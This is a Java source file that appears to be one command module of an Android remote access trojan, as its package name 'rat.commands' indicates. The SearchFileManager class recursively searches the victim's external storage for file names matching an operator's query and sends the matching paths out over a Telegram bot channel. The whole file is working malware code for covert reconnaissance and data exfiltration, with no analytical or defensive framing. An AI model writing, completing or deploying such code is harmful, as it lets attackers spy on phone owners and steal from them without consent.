package com.enterprise.rat.commands;

import android.os.Environment;
import com.enterprise.rat.utils.TelegramApi;
import java.io.File;
import java.util.ArrayList;
import java.util.List;

public class SearchFileManager {
    public void search(String path, String query) {
        File dir = new File(path != null ? path : Environment.getExternalStorageDirectory().getAbsolutePath());
        if (!dir.exists()) { TelegramApi.sendMessage("Path not found."); return; }
        List<String> results = new ArrayList<>();
        searchRec(dir, query.toLowerCase(), results, 30);
        StringBuilder sb = new StringBuilder("<b>🔍 Results for " + query + "</b>\n\n");
        if (results.isEmpty()) sb.append("No files found.");
        else for (String r : results) sb.append("<code>").append(r).append("</code>\n");
        TelegramApi.sendMessage(sb.toString());
    }
    private void searchRec(File dir, String query, List<String> results, int max) {
        if (results.size() >= max) return;
        File[] files = dir.listFiles();
        if (files == null) return;
        for (File f : files) {
            if (results.size() >= max) return;
            if (f.getName().toLowerCase().contains(query)) results.add(f.getAbsolutePath());
            if (f.isDirectory()) searchRec(f, query, results, max);
        }
    }
}
